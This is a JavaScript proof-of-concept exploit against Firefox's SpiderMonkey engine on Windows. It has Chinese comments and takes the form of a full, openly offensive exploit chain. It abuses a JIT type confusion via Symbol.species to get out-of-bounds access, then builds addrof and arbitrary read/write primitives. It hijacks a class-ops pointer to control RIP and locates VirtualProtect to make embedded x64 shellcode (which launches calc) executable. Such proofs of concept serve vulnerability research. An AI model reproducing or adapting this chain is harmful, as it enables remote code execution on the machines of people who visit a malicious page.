//load("../poc/exp-tools/utils.js");
//load("../poc/exp-tools/int64.js");
let Trigger = false;
let Arr = null;
let oob_arr = null;
let ua8 = null;
let Spray = [];
let wrong_value  = new Int64("0");
let flag = true;
const shellcode = new Uint8Array([
    0x90,
    0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x08, 0x48, 0x8b, 0xec, 0x48, 0x8d, 0x64, 0x24, 0xe8,
    0x48, 0x8d, 0x05, 0x6b, 0x02, 0x00, 0x00, 0x48, 0x89, 0x45, 0xe8, 0x6a, 0x00, 0x8f, 0x45, 0xf0,
    0x48, 0x8d, 0x05, 0x6b, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x08, 0x48, 0x8d, 0x55, 0xe8, 0xe8, 0x74,
    0x01, 0x00, 0x00, 0xe8, 0xd0, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x64, 0x24, 0xe0, 0x48, 0x8d, 0x15,
    0x3e, 0x02, 0x00, 0x00, 0xff, 0x52, 0x08, 0x48, 0x83, 0xc4, 0x20, 0x53, 0x56, 0x57, 0x41, 0x54,
    0x55, 0x48, 0x8b, 0xec, 0x6a, 0x60, 0x58, 0x65, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48,
    0x8b, 0x70, 0x10, 0x48, 0x8b, 0x46, 0x30, 0x48, 0x83, 0xf8, 0x00, 0x74, 0x13, 0xeb, 0x08, 0x4c,
    0x8b, 0x06, 0x49, 0x8b, 0xf0, 0xeb, 0xec, 0x45, 0x33, 0xdb, 0x66, 0x45, 0x33, 0xd2, 0xeb, 0x09,
    0x33, 0xc0, 0xc9, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0x66, 0x8b, 0x46, 0x58, 0x66, 0x44, 0x3b,
    0xd0, 0x72, 0x11, 0xeb, 0x3c, 0x66, 0x45, 0x8b, 0xc2, 0x66, 0x41, 0x83, 0xc0, 0x02, 0x66, 0x45,
    0x8b, 0xd0, 0xeb, 0xe5, 0x45, 0x8b, 0xcb, 0x41, 0xc1, 0xe9, 0x0d, 0x41, 0x8b, 0xc3, 0xc1, 0xe0,
    0x13, 0x44, 0x0b, 0xc8, 0x41, 0x8b, 0xc1, 0x4c, 0x8b, 0x46, 0x60, 0x45, 0x0f, 0xb7, 0xca, 0x4d,
    0x03, 0xc1, 0x45, 0x8a, 0x00, 0x45, 0x0f, 0xbe, 0xc0, 0x41, 0x83, 0xf8, 0x61, 0x72, 0x15, 0xeb,
    0x07, 0x41, 0x3b, 0xcb, 0x74, 0x16, 0xeb, 0x97, 0x41, 0x83, 0xe8, 0x20, 0x41, 0x03, 0xc0, 0x44,
    0x8b, 0xd8, 0xeb, 0xb1, 0x41, 0x03, 0xc0, 0x44, 0x8b, 0xd8, 0xeb, 0xa9, 0x4c, 0x8b, 0x56, 0x30,
    0x41, 0x8b, 0x42, 0x3c, 0x4d, 0x8b, 0xe2, 0x4c, 0x03, 0xe0, 0x41, 0x8b, 0x84, 0x24, 0x88, 0x00,
    0x00, 0x00, 0x4d, 0x8b, 0xca, 0x4c, 0x03, 0xc8, 0x45, 0x33, 0xdb, 0x41, 0x8b, 0x41, 0x18, 0x44,
    0x3b, 0xd8, 0x72, 0x0b, 0xe9, 0x56, 0xff, 0xff, 0xff, 0x41, 0x83, 0xc3, 0x01, 0xeb, 0xec, 0x41,
    0x8b, 0x41, 0x20, 0x49, 0x8b, 0xda, 0x48, 0x03, 0xd8, 0x45, 0x8b, 0xc3, 0x48, 0x8b, 0xc3, 0x4a,
    0x8d, 0x04, 0x80, 0x8b, 0x00, 0x49, 0x8b, 0xfa, 0x48, 0x03, 0xf8, 0x33, 0xc0, 0x48, 0x8b, 0xdf,
    0x48, 0x83, 0xc7, 0x01, 0x44, 0x8a, 0x03, 0x41, 0x0f, 0xbe, 0xd8, 0x83, 0xfb, 0x00, 0x74, 0x02,
    0xeb, 0x06, 0x3b, 0xd0, 0x74, 0x17, 0xeb, 0xc1, 0x44, 0x8b, 0xc0, 0x41, 0xc1, 0xe8, 0x0d, 0xc1,
    0xe0, 0x13, 0x44, 0x0b, 0xc0, 0x44, 0x03, 0xc3, 0x41, 0x8b, 0xc0, 0xeb, 0xd0, 0x41, 0x8b, 0x41,
    0x1c, 0x49, 0x8b, 0xd2, 0x48, 0x03, 0xd0, 0x41, 0x8b, 0x41, 0x24, 0x4d, 0x8b, 0xca, 0x4c, 0x03,
    0xc8, 0x45, 0x8b, 0xc3, 0x49, 0x8b, 0xc1, 0x4a, 0x8d, 0x04, 0x40, 0x66, 0x8b, 0x00, 0x0f, 0xb7,
    0xc8, 0x48, 0x8b, 0xc2, 0x48, 0x8d, 0x04, 0x88, 0x8b, 0x00, 0x4c, 0x03, 0xd0, 0x49, 0x8b, 0xc2,
    0xc9, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0x53, 0x56, 0x57, 0x41, 0x54, 0x55, 0x48, 0x8b, 0xec,
    0x48, 0x8b, 0xf1, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0x03, 0x48, 0x83, 0xf8, 0x00, 0x74, 0x0e, 0x48,
    0x8b, 0xc6, 0x48, 0x83, 0xc6, 0x04, 0x44, 0x8b, 0x20, 0x33, 0xff, 0xeb, 0x07, 0xc9, 0x41, 0x5c,
    0x5f, 0x5e, 0x5b, 0xc3, 0x8b, 0x06, 0x41, 0x8b, 0xcc, 0x8b, 0xd0, 0xe8, 0x6b, 0xfe, 0xff, 0xff,
    0x48, 0x8b, 0xd0, 0x48, 0x83, 0xfa, 0x00, 0x74, 0x02, 0xeb, 0x06, 0x48, 0x83, 0xc3, 0x08, 0xeb,
    0xc5, 0x48, 0x8b, 0x03, 0x48, 0x8b, 0xcf, 0x48, 0x83, 0xc7, 0x01, 0x48, 0x8d, 0x04, 0xc8, 0x48,
    0x89, 0x10, 0x48, 0x83, 0xc6, 0x04, 0xeb, 0xcc, 0x57, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x8d, 0xa4,
    0x24, 0x78, 0xff, 0xff, 0xff, 0x48, 0x8d, 0xbd, 0x78, 0xff, 0xff, 0xff, 0x32, 0xc0, 0x6a, 0x68,
    0x59, 0xf3, 0xaa, 0xc7, 0x85, 0x78, 0xff, 0xff, 0xff, 0x68, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x05,
    0x6e, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x10, 0x4c, 0x8d, 0x95, 0x78, 0xff, 0xff, 0xff, 0x48, 0x8d,
    0x45, 0xe0, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x45, 0x33, 0xc9, 0x50, 0x41, 0x52, 0x6a, 0x00, 0x6a,
    0x00, 0x6a, 0x00, 0x6a, 0x00, 0x48, 0x8d, 0x64, 0x24, 0xe0, 0x48, 0x8d, 0x05, 0x21, 0x00, 0x00,
    0x00, 0xff, 0x10, 0x48, 0x83, 0xc4, 0x50, 0xb9, 0x39, 0x05, 0x00, 0x00, 0x48, 0x8d, 0x64, 0x24,
    0xe0, 0x48, 0x8d, 0x15, 0x0a, 0x00, 0x00, 0x00, 0xff, 0x52, 0x08, 0x48, 0x83, 0xc4, 0x20, 0xc9,
    0x5f, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x17, 0xca, 0x2b, 0x6e, 0x72, 0xfe, 0xb3, 0x16, 0x7e, 0xd8, 0xe2, 0x73, 0x00, 0x00,
    0x00, 0x00, 0x63, 0x61, 0x6c, 0x63, 0x00
]);


let run_sc = new Float64Array(0x100);

let fake_length = new Int64("000001a400000000");
function Target(Special, Idx, Value) {
    Arr[Idx] = 1.1;
    Special.slice();
    Arr[Idx] = Value;
}

class SoSpecial extends Array {
    static get [Symbol.species]() {
        return function() {
            if(!Trigger) {
                return;
            }
            Arr.length = 0;
            for(let i = 0; i < 0x40000; i++){
                Spray.push(new Uint32Array(4));
            }
            //gc();
        };
    }
};

function JIT() {
    const Snowflake = new SoSpecial();
    Arr = new Array(0x7e);
    oob_arr = [1.1, 1.2, 1.3, 1.4];
    ua8 = new Uint8Array(0x10);
    for(let Idx = 0; Idx < 0x400; Idx++) {
        Target(Snowflake, 0x30, 1.1);
    }

    Trigger = true;
    Target(Snowflake, 0xA, fake_length.asDouble());
    //Target(Snowflake, 0xB, fake_length.asDouble());
}



/*
*   [+] oob 类型的array已经确定好了的. 接下来就是用我们越界的oob来实现我们的`r/w primitive`和`addrof primitive`
*/
class __Pwn{
    constructor(){
        this.SavedBase = oob_arr[13];
    }
    /**
     * 
     * @param {*} obj 
     * 泄露对象的地址
     */
    addrof(obj){
        oob_arr[14] = obj;
        oob_arr[13] = this.SavedBase;
        let res = ua8.slice(0, 8);
        return Int64.fromJSValue(res);
    }

    read_qword(addr){
        oob_arr[13] = addr.asDouble();
        let res = ua8.slice(0, 8);
        return new Int64(res);
    }

    write_qword(addr, value){
        value = new Int64(value);
        value = value.bytes();
        oob_arr[13] = addr.asDouble();
        ua8.set(value);
    }
}
let tmp_ab = new ArrayBuffer(0x8 * 100);
let pri_ab = new ArrayBuffer(0x8 * 100);

class _Real_Pwn{
    /*
    *   [+] 促使我们的temp_ab 的data指针指向我们的pri_ab_data.
    *   [+] 使用temp_ab 控制地址, 使用pri_ab来控制值
    */
    constructor(){
        this.temp_ab_addr = pwn.addrof(tmp_ab);
        this.pri_ab_addr = pwn.addrof(pri_ab);
        this.oddoffset = 0;
        console.log("[+] wrong value: " + wrong_value);
        if(Eq(this.temp_ab_addr, wrong_value)){
            console.log("[+] fuck the world");
            flag = false;
            location.reload();
            return ;
        }

        console.log("[+] temp ab's addr is: " + this.temp_ab_addr);
        console.log("[+] pri ab's addr is: " + this.pri_ab_addr);
        let temp_ab_data_addr = Add(this.temp_ab_addr, 0x20);
        let pri_ab_data_addr = Add(this.pri_ab_addr, 0x20);
        /**
         * [+] Change's temp_ab_addr point to pri_ab_addr
         */
        pwn.write_qword(temp_ab_data_addr, pri_ab_data_addr.assignRShift1(pri_ab_data_addr));
        //pwn.write_qword(temp_ab_data_addr, pri_ab_data_addr);
    }

    /**
     * [+] r/w primitive
     */
    read(addr){
        this.control_addr(addr);
        let pri_view = new Uint8Array(pri_ab);
        let bytes = pri_view.slice(this.oddoffset + 0, this.oddoffset + 8);
        //console.log("[+] bytes: " + bytes);
        return bytes;
        return Int64.fromJSValue(bytes);
        return new Int64(bytes);
    }
    read_dword(addr){
        let value = this.read(addr);
        const Bytes = new Uint8Array([0, 0, 0, 0, 0, 0, 0, 0]);
        Bytes.set(value.slice(0, 4), 0);
        return new Int64(Bytes);
    }
    read_qword(addr){
        let value = this.read(addr);
        return Int64.fromJSValue(value);
    }

    read_string(addr){
        let value = this.read(addr);
        let s = '';
        for(let i = 0; i < 8; i++){
            s += String.fromCharCode(value[i]);
        }
        return s;
    }

    write_qword(addr, value){
        value =  new Int64(value);
        this.control_addr(addr);
        let pri_view = new Float64Array(pri_ab);
        pri_view[0] = value.asDouble();
    }

    addrof(obj){
        /**
         * [+] wait me, here we will leak the obj's address
         */
        pri_ab.leak_obj = obj;
        let slot_addr = this.read_qword(Add(0x10, this.pri_ab_addr));
        let leak_addr = this.read_qword(slot_addr);
        return leak_addr;
    }
    /**
     * [+] 我日了个棒棒锤... 还是需要现在这里做好了再带到firefox当中去.
     */
    control_addr(addr){
        let temp_view = new Float64Array(tmp_ab);
        addr = new Int64(addr);
        if(addr.byteAt(0) & 0x1){
            this.oddoffset = 1;
        }else{
            this.oddoffset = 0;
        }
        addr = addr.assignRShift1(addr);
        temp_view[0] = addr.asDouble();
    }
}

/*********************************************************
*functions used for debugging defined here
**********************************************************/
/*
function console.log(info)
{
	document.getElementById("e_div").innerHTML += "<h3>"+ info +"</h3>"
}
*/

function control_rip(rip_addr){
    let addr = pwn_tool.addrof(run_sc); /*  [+] Need use run_sc to control thge stack frame */
    let group_addr = pwn_tool.read_qword(addr);
    let clasp_addr = pwn_tool.read_qword(group_addr);

    let shape_addr = pwn_tool.read_qword(Add(addr, 0x8));
    let shape_base_addr = pwn_tool.read_qword(shape_addr);
    console.log("[+] leak_addr is : " + addr);
    //pwn.write_qword(addr, "0x41414141");
    console.log("[+] read qword: " + pwn_tool.read_qword(addr));
    console.log("[+] The group's addr is: "+ group_addr);
    console.log("[+] The clasp's addr is: " + clasp_addr);

    console.log("[+] The shape's base addr is: " + shape_base_addr);
    /*
    *   [+] 现在需要去控制`clasp`的指针.
    */

    /*  [+] copy the content of clasp*/
    let fake_clasp = new Array(6);

    for(let i = 0; i < 0x6; i++){
        let value = pwn_tool.read_qword(Add(clasp_addr, 0x8 * i));
        fake_clasp[i] = value.asDouble();
    }

    let fake_clasp_obj_addr = pwn_tool.addrof(fake_clasp);
    let fake_clasp_addr = pwn_tool.read_qword(Add(fake_clasp_obj_addr, 0x18));
    console.log("[+] fake_clasp_obj_addr is: " + fake_clasp_obj_addr);
    console.log("[+] fake_clasp_addr is: " + fake_clasp_addr);

    /*
    *   [+] 现在我们只需要修改cops就可以了
    */
    rip_addr = find_ropgatget();
    console.log("[+] rip addr should be: "+ rip_addr);
    let fake_cops = [rip_addr.asDouble()];

    let fake_cops_obj_addr = pwn_tool.addrof(fake_cops);
    let fake_cops_addr = pwn_tool.read_qword(Add(fake_cops_obj_addr, 0x18));

    console.log("[+] fake cops addr is: " + fake_cops_addr);
    fake_clasp[2] = fake_cops_addr.asDouble();

    pwn_tool.write_qword(group_addr, fake_clasp_addr);
    pwn_tool.write_qword(shape_base_addr, fake_clasp_addr);
    console.log("[+] Tell me I can Control the rip");
    run_sc.rc = 1;
    /**
     * [+] 从这里开始可以控制对象的eip. 
     */
}

const build_rop_chain = function(){
    const mark_value = 3.439808012924939e+175;
    const D = 2.487982602987859e-275;
    const A = 2.487982018260472e-275;
    const B = 2.4878608212525747e-275;
    const C = -6.380930795567661e-228;
}

function find_ropgatget(){

    for(let i = 0; i < 12; i++){
        build_rop_chain();
    }

    let func_addr = pwn_tool.addrof(build_rop_chain);
    let jit_info = Add(func_addr, 0x30);
    let jit_addr = pwn_tool.read_qword(jit_info);
    let code_addr = pwn_tool.read_qword(jit_addr);
    console.log("[+] build rop chain func address: " + func_addr);
    console.log("[+] code addr: " + code_addr);

    const mark_value = [3.439808012924939e+175];
    let  mark_addr = pwn_tool.addrof(mark_value);
    console.log("[+] mark_addr: " + mark_addr);
    let s = pwn_tool.read_string(Add(mark_addr, 0x30));
    console.log("[+] string value: " + s);

    let find_addr = code_addr;
    for(let i = 0; i < 0x4000; i++){
        let s = pwn_tool.read_string(find_addr);
        //console.log(s);
        if(s === "wjllzbad"){
            console.log("Gogogo");
            break;
        }
        find_addr = Add(code_addr, i);
    }
    let rop_addr = Add(find_addr , 0xe);
    console.log("[+] The Rop gadget addr is: " + rop_addr);
    return rop_addr;

}

function find_virtualProtect(){

    let xul_ptr = pwn_tool.read_qword(Add(pwn_tool.temp_ab_addr, 0x18));
    console.log("[+] The xul ptr is: " + xul_ptr);

    if(Eq(xul_ptr, wrong_value)){
        console.log("[+] reload");
        location.reload();
    }
    /*
    *   [+] Now we should use this ptr to leak the xul base address
    */
    let js_page = alignDownPage(xul_ptr);

    while(true){
        //let magic_value = "MZ";
        let value = pwn_tool.read_qword(js_page);   
        let bytes = value.bytes();
        let magic = String.fromCharCode(bytes[0], bytes[1]);
        if(magic == "MZ"){
            console.log("[+] Find the base is: " + js_page);
            break;
        }
        js_page = Sub(js_page, 0x1000);

    }
    let js_base = js_page;
    let e_lfanew = pwn_tool.read_dword(Add(js_base, 0x3c));
    console.log("[+] e_lfanew: " + e_lfanew);

    let IMAGE_NT_HEADERS32_ADDR = Add(js_base, e_lfanew); 
    let _IMAGE_OPTIONAL_HEADER64 = Add(IMAGE_NT_HEADERS32_ADDR, 0x18);

    console.log("[+] _IMAGE_OPTIONAL_HEADER4: " + _IMAGE_OPTIONAL_HEADER64);
    let IAT_TABLE_DICT =  Add(_IMAGE_OPTIONAL_HEADER64, 0x70 + (1 * 0x8));
    let IAT_RVA = pwn_tool.read_dword(IAT_TABLE_DICT);

    console.log("[+] IAT_RVA: " + IAT_RVA);
    let IAT_TABLE_ADDRESS = Add(js_base, IAT_RVA);
    console.log("[+] IAT_TABLE_ADDRESS: " + IAT_TABLE_ADDRESS);

    for(let i = 0; i < 0x20; i++){
        let name_addr_offset = Add(IAT_TABLE_ADDRESS, (3 + 5 * i) * 4);

        let offset = pwn_tool.read_dword(name_addr_offset);
        console.log("[+] offset: " + offset);
        let fuck_off = Add(js_base, offset);
        console.log("[+] fuck_off: " + fuck_off);

        let name = pwn_tool.read_string(fuck_off);
        console.log("[+] The name is: " + name);
        let mark_name = "KERNEL32";

        if(name == mark_name){
            /*
            *   [+] find it
            */
            console.log("[+] Find it");
            let INT_ADDRESS = Add(js_base, pwn_tool.read_dword(Sub(name_addr_offset, 0x4 * 3)));
            let IAT_ADDRESS = Add(js_base, pwn_tool.read_dword(Add(name_addr_offset, 0x4)));
            console.log("[+] INT_ADDRESS: " + INT_ADDRESS);
            console.log("[+] IAT_ADDRESS: " + IAT_ADDRESS);

            for(let j = 0; j < 0x400; j++){
                let func_name_rva = pwn_tool.read_dword(Add(INT_ADDRESS, j * 8));
                func_name_rva = Add(func_name_rva, 2);
                let func_name = pwn_tool.read_string(Add(js_base, func_name_rva));

                console.log("[+] The func name: " + func_name);
                console.log("[+] func_name_rva: " + func_name_rva);
                console.log("[+] The address: " + Add(js_base, func_name_rva));

                if(func_name == "VirtualP"){
                    console.log("[+] Find the idx: " + j);
                    let vp_saved_addr_offset = Add(IAT_ADDRESS, j * 8);

                    let vp_rva = pwn_tool.read_qword(vp_saved_addr_offset);

                    console.log("[+] vp_offset: " + vp_saved_addr_offset);
                    console.log("[+] vp_rva: " + vp_rva);
                    return vp_rva;
                    break;
                }
            }
            break;
        }
    }
    //alert('[+] wait me ');
}

function fake_stack(){
    /*
    *   [+] [rdx] 就是run_sc+38 就是值 
    */
    let vp_addr = find_virtualProtect();
    /*  [+] shellcode addr */
    let sc_arr_addr = pwn_tool.addrof(shellcode);
    let sc_addr = pwn_tool.read_qword(Add(sc_arr_addr, 0x38));
    console.log("[+] ac_arr_addr: " + sc_arr_addr);
    console.log("[+] shellcode 's addr: " + sc_addr);
    console.log("[+] The virtualProtect address: " + vp_addr);
    //let vp_addr = new Int64("00007ffc27d8af90");
    /*  [+] Now we need to make rsp to be our rop chain */
    run_sc[0] = sc_addr.asDouble();
    run_sc[1] = new Int64("1000").asDouble();
    run_sc[2] = new Int64("40").asDouble();
    run_sc[3] = sc_arr_addr.asDouble();
    run_sc[4] = vp_addr.asDouble();
    run_sc[5] = sc_addr.asDouble();
}

JIT();
let pwn = new __Pwn();
let pwn_tool = new _Real_Pwn();
if(flag){
    fake_stack();
    control_rip(0x1234);
}